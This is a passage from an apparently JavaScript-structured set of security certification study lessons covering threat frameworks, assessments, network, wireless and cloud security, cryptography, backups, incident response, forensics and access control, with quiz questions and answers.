            "Understand Cyber Kill Chain stages",
            "Map defenses to attack techniques",
            "Use frameworks for threat hunting"
          ]
        },
        sections: [
          {
            title: "MITRE ATT&CK",
            content: "**Structure:**\n- Tactics: WHY (attacker goals)\n- Techniques: HOW (methods used)\n- Procedures: Specific implementations\n\n**Key Tactics:**\n- Initial Access\n- Execution\n- Persistence\n- Privilege Escalation\n- Defense Evasion\n- Credential Access\n- Discovery\n- Lateral Movement\n- Collection\n- Exfiltration\n- Command & Control\n- Impact",
            key_points: [
              "Tactics = goals (why)",
              "Techniques = methods (how)",
              "Maps attacker behavior to defenses",
              "Used for detection and hunting"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "MITRE ATT&CK: Tactics (why) + Techniques (how)",
            "Kill Chain: 7 stages of attacks",
            "Frameworks map defenses to attacks",
            "Enable threat hunting and detection"
          ],
          exam_essentials: [
            "ATT&CK Tactics = goals",
            "ATT&CK Techniques = methods",
            "Kill Chain breaks attacks into stages",
            "Disrupting any stage stops attack"
          ]
        }
      },
      {
        id: 'D2-LESSON-012',
        domain: 2,
        title: 'Security Assessments',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Security assessments validate controls and identify weaknesses. From vulnerability scans to penetration tests, assessments are essential for security validation.",
          learning_goals: [
            "Differentiate assessment types",
            "Understand penetration testing methodology",
            "Apply assessment findings",
            "Manage assessment programs"
          ]
        },
        sections: [
          {
            title: "Assessment Types",
            content: "**Vulnerability Assessment:**\nIdentify weaknesses without exploitation. Automated scanning.\n\n**Penetration Testing:**\nAttempt exploitation to prove vulnerabilities. Manual testing.\n\n**Red Team:**\nAdversary simulation. Goal-focused, tests detection.\n\n**Blue Team:**\nDefenders. Detect and respond to red team.\n\n**Purple Team:**\nCollaboration between red and blue. Improve both.\n\n**Bug Bounty:**\nCrowdsourced security testing. Rewards for vulnerabilities.",
            key_points: [
              "Vuln assessment = identify; Pen test = exploit",
              "Red team = attackers; Blue team = defenders",
              "Purple team = collaboration",
              "Bug bounty = crowdsourced testing"
            ],
            knowledge_check: {
              question: "What distinguishes penetration testing from vulnerability assessment?",
              options: [
                "Penetration testing uses automated tools only",
                "Penetration testing attempts actual exploitation",
                "Vulnerability assessment is more thorough",
                "Vulnerability assessment requires physical access"
              ],
              correct: 1,
              explanation: "Penetration testing attempts actual exploitation to prove vulnerabilities are exploitable. Vulnerability assessment identifies without exploiting."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Vuln assessment identifies; pen test exploits",
            "Red team attacks; Blue team defends",
            "Purple team improves both sides",
            "Bug bounty provides crowdsourced testing"
          ],
          exam_essentials: [
            "Vulnerability scan = identify only",
            "Penetration test = exploit to prove",
            "Red/Blue/Purple team roles",
            "Bug bounty = crowdsourced"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 3: Security Architecture
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D3-LESSON-001',
        domain: 3,
        title: 'Security Architecture Concepts',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "The Titanic had watertight compartments but bulkheads weren't tall enough—water spilled over. Security architecture faces the same challenge: designing systems where a breach doesn't sink the organization.",
          learning_goals: [
            "Apply security architecture principles",
            "Design with defense in depth and zero trust",
            "Implement secure system design patterns",
            "Balance security with usability"
          ]
        },
        sections: [
          {
            title: "Architecture Principles",
            content: "**Defense in Depth:**\nMultiple overlapping security layers. No single point of failure.\n\n**Zero Trust:**\nNever trust, always verify. Network location doesn't grant access.\n\n**Least Privilege:**\nMinimum access needed for job function.\n\n**Separation of Duties:**\nNo single person controls entire critical process.\n\n**Fail Secure:**\nSystem fails to secure state (deny access).\n\n**Fail Open:**\nSystem fails to permissive state (allow access)—use cautiously.",
            key_points: [
              "Defense in depth = multiple layers",
              "Zero trust = verify every request",
              "Fail secure > fail open for security",
              "Separation of duties prevents fraud"
            ],
            knowledge_check: {
              question: "A door lock loses power and automatically locks. Is this fail secure or fail open?",
              options: [
                "Fail open—door can't be opened",
                "Fail secure—door denies access when failing",
                "Neither—it's a safety issue",
                "Both—depends on configuration"
              ],
              correct: 1,
              explanation: "Fail secure—the door denies access (locks) when failing. Fail open would unlock the door."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Defense in depth = multiple overlapping layers",
            "Zero trust = never trust, always verify",
            "Fail secure denies access on failure",
            "Separation of duties prevents single-person control"
          ],
          exam_essentials: [
            "Fail secure = deny on failure",
            "Fail open = allow on failure",
            "Zero trust = no implicit network trust",
            "Least privilege = minimum necessary access"
          ]
        }
      },
      {
        id: 'D3-LESSON-002',
        domain: 3,
        title: 'Infrastructure Security',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Infrastructure security protects the physical and virtual systems that run your environment. From servers to hypervisors to embedded systems.",
          learning_goals: [
            "Implement server and endpoint hardening",
            "Secure virtualization environments",
            "Protect embedded and IoT systems",
            "Apply infrastructure security controls"
          ]
        },
        sections: [
          {
            title: "Server and Endpoint Security",
            content: "**Server Hardening:**\n- Minimal installation\n- Disable unnecessary services\n- Secure baselines (CIS/STIGs)\n- Regular patching\n\n**EDR (Endpoint Detection & Response):**\n- Behavioral detection beyond signatures\n- Forensic capabilities\n- Automated response\n- Visibility into endpoint activity\n\n**Virtualization Security:**\n- Type 1 hypervisor (bare metal): More secure\n- Type 2 hypervisor (hosted): Less secure\n- VM escape: Breaking out of VM to hypervisor (critical threat)\n- VM sprawl: Too many unmanaged VMs",
            key_points: [
              "EDR provides behavioral detection + response",
              "Type 1 hypervisor is more secure than Type 2",
              "VM escape is a critical threat",
              "Minimal installation reduces attack surface"
            ],
            exam_tips: [
              "Type 1 = bare metal (ESXi, Hyper-V)",
              "Type 2 = hosted (VirtualBox, VMware Workstation)",
              "VM escape = critical virtualization threat"
            ]
          },
          {
            title: "Embedded and IoT Security",
            content: "**Challenges:**\n- Limited resources for security\n- Difficult or impossible to patch\n- Long lifespans\n- Default credentials common\n\n**SCADA/ICS:**\n- Industrial control systems\n- Safety-critical operations\n- Legacy protocols (often insecure)\n- Network isolation essential\n\n**Mitigation:**\n- Network segmentation/isolation\n- Dedicated IoT networks\n- Monitor for anomalies\n- Change default credentials",
            key_points: [
              "IoT often can't be patched",
              "SCADA/ICS requires network isolation",
              "Default credentials are major risk",
              "Segmentation protects unpatched devices"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "EDR provides behavioral detection beyond signatures",
            "Type 1 hypervisor is more secure (bare metal)",
            "VM escape is critical virtualization threat",
            "IoT/SCADA requires network isolation"
          ],
          exam_essentials: [
            "EDR = behavioral detection + forensics + response",
            "Type 1 = bare metal; Type 2 = hosted",
            "VM escape = breaking out of VM",
            "SCADA = network isolation, can't patch"
          ]
        }
      },
      {
        id: 'D3-LESSON-003',
        domain: 3,
        title: 'Network Security',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Networks are the highways of IT—all data travels across them. Network security controls who can communicate, detects threats, and enables secure remote access.",
          learning_goals: [
            "Implement firewalls and IDS/IPS",
            "Apply secure network protocols",
            "Design secure network architectures",
            "Configure VPN and remote access"
          ]
        },
        sections: [
          {
            title: "Network Security Devices",
            content: "**Firewalls:**\n- Packet filtering: Layer 3/4, stateless\n- Stateful inspection: Tracks connections\n- NGFW: Deep inspection, application awareness, IPS built-in\n- WAF: Layer 7, protects web applications\n\n**IDS vs IPS:**\n- IDS: Detects and alerts (passive)\n- IPS: Detects and blocks (inline)\n\n**Proxy Servers:**\n- Forward proxy: Client → Proxy → Internet\n- Reverse proxy: Internet → Proxy → Server",
            key_points: [
              "NGFW = firewall + IPS + application awareness",
              "WAF protects web applications (Layer 7)",
              "IDS = detect; IPS = detect + block",
              "Forward proxy hides clients; Reverse proxy hides servers"
            ],
            knowledge_check: {
              question: "Which device would BEST protect a web application from SQL injection?",
              options: [
                "Packet filtering firewall",
                "Network-based IPS",
                "Web Application Firewall (WAF)",
                "Forward proxy"
              ],
              correct: 2,
              explanation: "WAF operates at Layer 7 and understands HTTP/web application attacks like SQL injection."
            }
          },
          {
            title: "Secure Protocols and VPN",
            content: "**TLS (Transport Layer Security):**\n- TLS 1.3: Current preferred\n- TLS 1.2: Acceptable minimum\n- TLS 1.0/1.1: Deprecated\n\n**VPN Types:**\n- IPsec: Site-to-site (tunnel mode) or remote (transport)\n- SSL/TLS VPN: Remote access, easier through firewalls\n- ZTNA: Zero Trust Network Access, app-specific\n\n**802.1X:**\nPort-based network access control. Supplicant → Authenticator → RADIUS.",
            key_points: [
              "TLS 1.3 preferred, 1.2 minimum",
              "IPsec tunnel mode for site-to-site",
              "ZTNA = app-specific access, not network-level",
              "802.1X uses RADIUS for authentication"
            ],
            exam_tips: [
              "TLS 1.3 > TLS 1.2 > TLS 1.0/1.1 (deprecated)",
              "IPsec tunnel mode = site-to-site VPN",
              "802.1X: Supplicant → Authenticator → RADIUS"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "NGFW combines firewall + IPS + application awareness",
            "WAF protects web applications at Layer 7",
            "IDS detects; IPS detects and blocks",
            "TLS 1.3 preferred; 1.2 minimum"
          ],
          exam_essentials: [
            "NGFW = firewall + IPS + app awareness + SSL inspection",
            "WAF = Layer 7 web protection",
            "IDS = passive; IPS = inline blocking",
            "802.1X = port-based NAC with RADIUS"
          ]
        }
      },
      {
        id: 'D3-LESSON-004',
        domain: 3,
        title: 'Wireless Security',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "TJX lost 45 million credit cards because attackers cracked weak WEP from the parking lot. Wireless extends your perimeter into the air itself.",
          learning_goals: [
            "Understand wireless security protocols",
            "Implement WPA3 and enterprise authentication",
            "Defend against wireless attacks",
            "Secure Bluetooth and other wireless"
          ]
        },
        sections: [
          {
            title: "Wireless Security Protocols",
            content: "**Protocol Evolution:**\n- WEP: BROKEN, crack in minutes, never use\n- WPA: TKIP, deprecated\n- WPA2: AES-CCMP, current minimum\n- WPA3: SAE, resistant to offline attacks\n\n**Authentication Modes:**\n- Personal (PSK): Shared password\n- Enterprise (802.1X): Individual credentials via RADIUS\n\n**WPA3 Benefits:**\n- SAE (Simultaneous Authentication of Equals)\n- Protection against offline dictionary attacks\n- Forward secrecy",
            key_points: [
              "WPA3 preferred, WPA2-AES minimum",
              "WEP and WPA are broken—never use",
              "Enterprise mode uses individual credentials",
              "WPA3 SAE resists offline attacks"
            ],
            knowledge_check: {
              question: "Which wireless protocol should NEVER be used?",
              options: [
                "WPA3-SAE",
                "WPA2-AES",
                "WEP",
                "WPA2-Enterprise"
              ],
              correct: 2,
              explanation: "WEP is completely broken—can be cracked in minutes. Never use WEP for any purpose."
            }
          },
          {
            title: "Wireless Attacks",
            content: "**Evil Twin:**\nFake AP with same SSID as legitimate network. MITM attack.\n\n**Rogue AP:**\nUnauthorized AP on corporate network.\n\n**Deauthentication Attack:**\nForce devices to reconnect (to capture handshake).\n\n**Bluetooth Attacks:**\n- Bluejacking: Unsolicited messages\n- Bluesnarfing: Data theft\n- Bluebugging: Full device control",
            key_points: [
              "Evil twin = fake AP with same SSID",
              "Rogue AP = unauthorized AP on network",
              "Bluesnarfing = Bluetooth data theft",
              "Bluebugging = Bluetooth full control"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "WPA3 preferred, WPA2-AES minimum",
            "WEP is completely broken",
            "Evil twin = fake AP with same SSID",
            "Bluesnarfing steals data; Bluebugging gives control"
          ],
          exam_essentials: [
            "WPA3 SAE resists offline dictionary attacks",
            "WPA2-Enterprise = 802.1X + RADIUS",
            "Evil twin = malicious AP same SSID",
            "Bluesnarfing = data theft; Bluebugging = control"
          ]
        }
      },
      {
        id: 'D3-LESSON-005',
        domain: 3,
        title: 'Cloud Security',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Capital One's breach exposed 100 million records—not because AWS was insecure, but because of a misconfigured web application firewall. Cloud providers secure the infrastructure; you secure what you put in it.",
          learning_goals: [
            "Understand cloud service and deployment models",
            "Apply the shared responsibility model",
            "Implement cloud security controls",
            "Secure containers and serverless"
          ]
        },
        sections: [
          {
            title: "Cloud Models",
            content: "**Service Models:**\n- IaaS: You manage OS and up (EC2, Azure VMs)\n- PaaS: You manage applications/data (Elastic Beanstalk, App Service)\n- SaaS: You manage data/access only (M365, Salesforce)\n\n**Deployment Models:**\n- Public: Shared infrastructure, multi-tenant\n- Private: Dedicated to single organization\n- Hybrid: Mix of public and private\n- Community: Shared by organizations with common concerns\n\n**Shared Responsibility Model:**\nProvider responsible for security OF the cloud.\nCustomer responsible for security IN the cloud.",
            key_points: [
              "IaaS = most customer responsibility",
              "SaaS = least customer responsibility",
              "Shared responsibility divides security duties",
              "Customer always responsible for data"
            ],
            knowledge_check: {
              question: "In IaaS, who is responsible for patching the operating system?",
              options: [
                "Cloud provider",
                "Customer",
                "Shared equally",
                "Third-party vendor"
              ],
              correct: 1,
              explanation: "In IaaS, the customer manages OS and up—including patching. Provider handles physical hardware and virtualization layer."
            }
          },
          {
            title: "Cloud Security Controls",
            content: "**CASB (Cloud Access Security Broker):**\nVisibility and control over cloud services. Detects shadow IT.\n\n**CSPM (Cloud Security Posture Management):**\nIdentifies misconfigurations in cloud environments.\n\n**Container Security:**\n- Image scanning\n- Runtime protection\n- Immutable infrastructure\n- Minimal base images\n\n**Serverless Security:**\n- Function-level permissions\n- Dependency scanning\n- API gateway protection",
            key_points: [
              "CASB provides visibility into cloud usage",
              "CSPM detects misconfigurations",
              "Container images need scanning",
              "Serverless needs function-level security"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Shared responsibility: Provider = OF cloud; Customer = IN cloud",
            "IaaS = most customer responsibility",
            "CASB provides cloud visibility",
            "CSPM detects misconfigurations"
          ],
          exam_essentials: [
            "IaaS/PaaS/SaaS responsibility differences",
            "Customer always owns data security",
            "CASB = cloud visibility/control",
            "CSPM = misconfiguration detection"
          ]
        }
      },
      {
        id: 'D3-LESSON-006',
        domain: 3,
        title: 'Cryptography',
        difficulty: 'intermediate',
        duration: '60 min',
        introduction: {
          hook: "Snowden's revelations showed that strong encryption protected communications even from nation-states. Cryptography is the foundation of digital trust.",
          learning_goals: [
            "Implement symmetric and asymmetric encryption",
            "Apply hashing for integrity",
            "Understand digital signatures",
            "Recognize cryptographic weaknesses"
          ]
        },
        sections: [
          {
            title: "Encryption Concepts",
            content: "**Symmetric Encryption:**\n- Same key encrypts and decrypts\n- Fast, good for bulk data\n- Key distribution challenge\n- AES-256 is standard\n\n**Asymmetric Encryption:**\n- Public/private key pair\n- Encrypt with public, decrypt with private\n- Slower, solves key distribution\n- RSA, ECC common\n\n**Hybrid Encryption:**\nUse asymmetric to exchange symmetric key, then symmetric for data.",
            key_points: [
              "Symmetric = same key, fast",
              "Asymmetric = key pair, solves distribution",
              "AES-256 = symmetric standard",
              "Hybrid = best of both worlds"
            ]
          },
          {
            title: "Hashing and Signatures",
            content: "**Hash Functions:**\n- One-way, fixed output\n- SHA-256, SHA-3: Current standards\n- MD5, SHA-1: Deprecated\n\n**Password Hashing:**\n- Use slow algorithms: bcrypt, Argon2\n- Add unique salt per password\n\n**Digital Signatures:**\n1. Hash the message\n2. Encrypt hash with private key\n3. Verify with public key\n\nProvides: Integrity + Authentication + Non-repudiation",
            key_points: [
              "SHA-256 is current hash standard",
              "MD5/SHA-1 are deprecated",
              "Passwords: bcrypt/Argon2 + salt",
              "Digital signatures provide non-repudiation"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "AES = symmetric; RSA/ECC = asymmetric",
            "SHA-256 = hash standard; MD5/SHA-1 deprecated",
            "Digital signatures = integrity + auth + non-repudiation",
            "Passwords need slow hashing + salt"
          ],
          exam_essentials: [
            "AES-256 = symmetric standard",
            "RSA/ECC = asymmetric",
            "SHA-256/SHA-3 = hash standards",
            "Sign with PRIVATE; Verify with PUBLIC"
          ]
        }
      },
      {
        id: 'D3-LESSON-007',
        domain: 3,
        title: 'Resilience & Recovery',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "OVH's data center fire destroyed customer data because backups were stored in the same facility that burned. Resilience means surviving disasters.",
          learning_goals: [
            "Design high availability architectures",
            "Implement backup strategies",
            "Develop disaster recovery plans",
            "Understand business continuity"
          ]
        },
        sections: [
          {
            title: "High Availability",
            content: "**Availability Metrics:**\n- 99% = 3.65 days downtime/year\n- 99.9% = 8.76 hours/year\n- 99.99% = 52.6 minutes/year\n- 99.999% = 5.26 minutes/year\n\n**Redundancy:**\n- Active-Active: All servers active\n- Active-Passive: Standby ready\n- N+1: One spare per N servers\n\n**RAID Levels:**\n- RAID 1: Mirroring\n- RAID 5: Striping with parity (1 disk failure)\n- RAID 6: Double parity (2 disk failures)",
            key_points: [
              "Five nines = 5.26 min downtime/year",
              "Active-Active provides best availability",
              "RAID 5 = 1 disk failure; RAID 6 = 2 disks",
              "Redundancy eliminates single points of failure"
            ]
          },
          {
            title: "Backup and Recovery",
            content: "**Backup Types:**\n- Full: Complete copy, longest time\n- Incremental: Changes since last backup (any type)\n- Differential: Changes since last FULL backup\n\n**3-2-1 Rule:**\n- 3 copies of data\n- 2 different media types\n- 1 offsite copy\n\n**Recovery Objectives:**\n- RTO: Recovery Time Objective (maximum downtime)\n- RPO: Recovery Point Objective (maximum data loss)\n\n**Site Types:**\n- Hot: Immediate failover\n- Warm: Hours to activate\n- Cold: Days to activate",
            key_points: [
              "Incremental = since last backup (any)",
              "Differential = since last FULL backup",
              "RTO = downtime; RPO = data loss",
              "Hot site = immediate; Cold = days"
            ],
            knowledge_check: {
              question: "RPO is 4 hours, backups run daily. Is this acceptable?",
              options: [
                "Yes—daily backups are standard",
                "No—RPO requires backups at least every 4 hours",
                "Yes—RTO determines backup frequency",
                "No—RPO should always be 24 hours"
              ],
              correct: 1,
              explanation: "No—RPO of 4 hours means maximum 4 hours of data loss. Daily backups mean up to 24 hours of loss, violating the RPO."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Five nines = 5.26 minutes downtime/year",
            "3-2-1: 3 copies, 2 media, 1 offsite",
            "RTO = maximum downtime; RPO = maximum data loss",
            "Hot site = immediate; Cold = days"
          ],
          exam_essentials: [
            "RAID 1 = mirror; RAID 5 = parity; RAID 6 = double parity",
            "Incremental = since last backup; Differential = since last FULL",
            "RTO = downtime; RPO = data loss",
            "Hot/Warm/Cold = immediate/hours/days"
          ]
        }
      },
      {
        id: 'D3-LESSON-008',
        domain: 3,
        title: 'Data Protection',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Equifax exposed 147 million records. Data protection ensures sensitive data is classified, protected, and handled properly throughout its lifecycle.",
          learning_goals: [
            "Implement data classification",
            "Protect data at rest, in transit, in use",
            "Deploy Data Loss Prevention (DLP)",
            "Manage data lifecycle"
          ]
        },
        sections: [
          {
            title: "Data Classification and States",
            content: "**Classification Levels:**\n- Government: Top Secret → Secret → Confidential → Unclassified\n- Commercial: Restricted → Confidential → Internal → Public\n\n**Data States:**\n- At rest: Stored (encrypt with AES)\n- In transit: Moving (encrypt with TLS)\n- In use: Being processed (access controls)\n\n**DLP (Data Loss Prevention):**\n- Network DLP: Gateway inspection\n- Endpoint DLP: Agent on devices\n- Cloud DLP: CASB integration",
            key_points: [
              "Classification drives protection requirements",
              "Three states: rest, transit, use",
              "DLP prevents data exfiltration",
              "Each state needs different controls"
            ],
            knowledge_check: {
              question: "Which control BEST protects data in transit?",
              options: [
                "Full disk encryption",
                "TLS/SSL encryption",
                "Access controls",
                "Data classification"
              ],
              correct: 1,
              explanation: "TLS/SSL protects data in transit. Full disk encryption protects data at rest. Access controls protect data in use."
            }
          },
          {
            title: "Data Lifecycle",
            content: "**Lifecycle Stages:**\n1. Creation/Collection\n2. Storage\n3. Use/Processing\n4. Sharing/Transfer\n5. Archival\n6. Destruction\n\n**Secure Destruction:**\n- Crypto erasure: Destroy encryption keys\n- Degaussing: Magnetic media only\n- Physical destruction: Shredding, incineration\n\n**Privacy Concepts:**\n- Anonymization: Irreversible (can't re-identify)\n- Pseudonymization: Reversible with key",
            key_points: [
              "Destruction must be secure and verified",
              "Crypto erasure = destroy keys",
              "Anonymization = irreversible",
              "Pseudonymization = reversible"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Data states: rest (AES), transit (TLS), use (access controls)",
            "DLP prevents data exfiltration",
            "Crypto erasure destroys keys, not data",
            "Anonymization irreversible; Pseudonymization reversible"
          ],
          exam_essentials: [
            "At rest = AES; In transit = TLS",
            "DLP: Network, Endpoint, Cloud",
            "Degaussing = magnetic media only",
            "Anonymization = can't reverse"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 4: Security Operations
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D4-LESSON-001',
        domain: 4,
        title: 'Security Monitoring',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Target's security tools detected the breach and sent alerts. No one acted on them. Attackers had 16 days to steal 40 million credit cards. Monitoring without response is just expensive logging.",
          learning_goals: [
            "Configure and interpret SIEM systems",
            "Analyze security logs and IOCs",
            "Implement effective alerting",
            "Establish baselines and detect anomalies"
          ]
        },
        sections: [
          {
            title: "SIEM Fundamentals",
            content: "**SIEM Functions:**\n- Log aggregation from multiple sources\n- Event correlation and analysis\n- Alerting on suspicious patterns\n- Reporting and dashboards\n\n**Data Sources:**\n- Network: Firewall, IDS/IPS, proxy, DNS\n- Endpoint: Windows Event Logs, Syslog, EDR\n- Infrastructure: AD, DHCP, authentication\n- Cloud: Cloud provider logs, SaaS logs\n\n**SOAR (Security Orchestration, Automation, Response):**\nAutomates incident response workflows. Integrates with SIEM.",
            key_points: [
              "SIEM aggregates and correlates logs",
              "Multiple data sources provide context",
              "SOAR automates response workflows",
              "Correlation reduces false positives"
            ],
            knowledge_check: {
              question: "What is the PRIMARY purpose of SIEM correlation?",
              options: [
                "Store logs for compliance",
                "Connect related events to identify attacks",
                "Replace firewall logging",
                "Encrypt log data"
              ],
              correct: 1,
              explanation: "Correlation connects related events to identify attack patterns that single events wouldn't reveal."
            }
          },
          {
            title: "Log Analysis",
            content: "**Key Log Types:**\n- Authentication logs: Login success/failure\n- System logs: OS events, errors\n- Application logs: App-specific events\n- Security logs: Security tool alerts\n\n**Analysis Focus:**\n- Failed authentication patterns\n- Unusual process execution\n- Network connection anomalies\n- Privilege escalation attempts\n- Data exfiltration indicators",
            key_points: [
              "Authentication logs show access patterns",
              "Multiple failures may indicate attack",
              "Baseline comparison detects anomalies",
              "Context from multiple sources improves detection"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "SIEM aggregates logs and correlates events",
            "SOAR automates incident response",
            "Multiple log sources provide better detection",
            "Baselines enable anomaly detection"
          ],
          exam_essentials: [
            "SIEM = aggregate + correlate + alert",
            "SOAR = automation and orchestration",
            "Windows: Event Viewer; Linux: Syslog",
            "Correlation connects related events"
          ]
        }
      },
      {
        id: 'D4-LESSON-002',
        domain: 4,
        title: 'Incident Response',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "NotPetya wiped 45,000 PCs at Maersk. Recovery was possible because one domain controller in Ghana was offline during the attack. Incident response determines survival.",
          learning_goals: [
            "Execute the incident response lifecycle",
            "Implement containment strategies",
            "Coordinate response teams",
            "Conduct post-incident reviews"
          ]
        },
        sections: [
          {
            title: "IR Lifecycle (NIST)",
            content: "**1. Preparation:**\n- Develop IR plan\n- Build IR team\n- Acquire tools\n- Train personnel\n\n**2. Detection and Analysis:**\n- Monitor for incidents\n- Validate alerts\n- Determine scope\n- Assess impact\n\n**3. Containment, Eradication, Remediation:**\n- Stop the spread (contain)\n- Remove the threat (eradicate)\n- Fix vulnerabilities (remediate)\n- Restore systems (recover)\n\n**4. Post-Incident Activity:**\n- Lessons learned\n- Documentation\n- Process improvements",
            key_points: [
              "Preparation happens BEFORE incidents",
              "Containment limits spread",
              "Eradication removes threat",
              "Lessons learned improve future response"
            ],
            knowledge_check: {
              question: "During an active ransomware attack, what is the FIRST priority?",
              options: [
                "Identify the attacker",
                "Contain the spread",
                "Restore from backup",
                "Notify law enforcement"
              ],
              correct: 1,
              explanation: "Containment is first priority to stop the spread. Identification, restoration, and notification come after limiting damage."
            }
          },
          {
            title: "Containment Strategies",
            content: "**Short-term Containment:**\n- Network isolation (disconnect affected systems)\n- Disable accounts\n- Block malicious IPs/domains\n\n**Long-term Containment:**\n- Rebuild systems with hardening\n- Enhanced monitoring\n- Network segmentation\n\n**Evidence Preservation:**\n- Image systems before changes\n- Maintain chain of custody\n- Document all actions",
            key_points: [
              "Short-term = immediate isolation",
              "Long-term = rebuilt, hardened systems",
              "Preserve evidence before changes",
              "Document everything"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "IR phases: Prepare → Detect → Contain → Recover → Learn",
            "Containment is first response priority",
            "Preserve evidence before remediation",
            "Lessons learned improve future response"
          ],
          exam_essentials: [
            "IR order: Preparation → Detection → Containment → Eradication → Recovery → Lessons",
            "Containment stops spread first",
            "Chain of custody preserves evidence",
            "Post-incident review is mandatory"
          ]
        }
      },
      {
        id: 'D4-LESSON-003',
        domain: 4,
        title: 'Digital Forensics',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "DNC hackers were traced through metadata trails. Digital forensics reconstructs the truth—what happened, who did it, and how.",
          learning_goals: [
            "Apply forensic principles and evidence handling",
            "Perform forensic acquisition",
            "Analyze forensic artifacts",
            "Document findings for legal proceedings"
          ]
        },
        sections: [
          {
            title: "Forensic Principles",
            content: "**Chain of Custody:**\n- Who had evidence, when, why\n- Documented trail from collection to court\n- Critical for legal admissibility\n\n**Order of Volatility:**\n1. CPU registers/cache\n2. RAM (memory)\n3. Network connections\n4. Running processes\n5. Disk data\n6. Logs\n7. Physical configuration\n\nCollect most volatile first!",
            key_points: [
              "Chain of custody must be unbroken",
              "Collect most volatile evidence first",
              "Memory is highly volatile",
              "Document everything"
            ],
            knowledge_check: {
              question: "What should be collected FIRST during forensic acquisition?",
              options: [
                "Hard drive image",
                "RAM/memory dump",
                "Log files",
                "Physical configuration"
              ],
              correct: 1,
              explanation: "RAM/memory is highly volatile—lost when power off. Collect volatile evidence first per order of volatility."
            }
          },
          {
            title: "Forensic Acquisition",
            content: "**Acquisition Types:**\n- Bit-for-bit image: Exact copy including deleted data\n- Logical acquisition: Files and folders only\n- Live acquisition: Running system (for memory, network)\n\n**Hashing:**\n- Hash before and after acquisition\n- Proves evidence wasn't modified\n- SHA-256 or better\n\n**Write Blockers:**\nPrevent modifications to original evidence during acquisition.",
            key_points: [
              "Bit-for-bit captures everything",
              "Hash verification proves integrity",
              "Write blockers protect evidence",
              "Work on copies, not originals"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Chain of custody is critical for admissibility",
            "Collect volatile evidence first (RAM)",
            "Hash verification proves integrity",
            "Work on copies, preserve originals"
          ],
          exam_essentials: [
            "Order of volatility: CPU → RAM → Network → Disk",
            "Chain of custody = documentation trail",
            "Write blocker prevents evidence modification",
            "Hash before and after acquisition"
          ]
        }
      },
      {
        id: 'D4-LESSON-004',
        domain: 4,
        title: 'Vulnerability Management',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Vulnerability management is the continuous process of identifying, assessing, and remediating weaknesses before attackers exploit them.",
          learning_goals: [
            "Implement vulnerability scanning",
            "Prioritize using CVSS",
            "Develop remediation strategies",
            "Manage vulnerability lifecycle"
          ]
        },
        sections: [
          {
            title: "Vulnerability Scanning",
            content: "**Scan Types:**\n- Credentialed: Authenticated, most accurate\n- Non-credentialed: External view, less accurate\n- Agent-based: Continuous monitoring\n- Network-based: Point-in-time\n\n**CVSS Scoring:**\n- 9.0-10.0: Critical\n- 7.0-8.9: High\n- 4.0-6.9: Medium\n- 0.1-3.9: Low\n\n**Prioritization Factors:**\n- CVSS score\n- Asset criticality\n- Exploitability (known exploits?)\n- Business impact",
            key_points: [
              "Credentialed scans are most accurate",
              "CVSS provides severity scoring",
              "Prioritize by risk, not just CVSS",
              "Consider exploitability and asset value"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Credentialed scans provide best accuracy",
            "CVSS 9+ = Critical, 7+ = High",
            "Prioritize by risk, not just score",
            "Continuous scanning is essential"
          ],
          exam_essentials: [
            "Credentialed > non-credentialed accuracy",
            "CVSS: Critical/High/Medium/Low",
            "CVE = unique vulnerability ID",
            "Virtual patching = WAF/IPS protection"
          ]
        }
      },
      {
        id: 'D4-LESSON-005',
        domain: 4,
        title: 'Identity & Access Management',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "IAM controls who can access what resources. Proper IAM implementation is foundational to Zero Trust and least privilege.",
          learning_goals: [
            "Implement identity management",
            "Configure access controls",
            "Deploy privileged access management",
            "Manage identity lifecycle"
          ]
        },
        sections: [
          {
            title: "Access Control Models",
            content: "**DAC (Discretionary Access Control):**\nOwner decides who gets access. Flexible but inconsistent.\n\n**MAC (Mandatory Access Control):**\nLabels determine access. Government/military. Rigid.\n\n**RBAC (Role-Based Access Control):**\nAccess based on job role. Scalable for enterprises.\n\n**ABAC (Attribute-Based Access Control):**\nPolicies based on attributes (user, resource, environment).\n\n**Rule-Based:**\nIf-then rules determine access.",
            key_points: [
              "DAC = owner decides (flexible)",
              "MAC = labels (rigid, government)",
              "RBAC = roles (enterprise standard)",
              "ABAC = attributes (most granular)"
            ],
            knowledge_check: {
              question: "Which access model assigns permissions based on job function?",
              options: [
                "DAC",
                "MAC",
                "RBAC",
                "Rule-Based"
              ],
              correct: 2,
              explanation: "RBAC (Role-Based Access Control) assigns permissions based on job roles, making it scalable for enterprises."
            }
          },
          {
            title: "Privileged Access Management",
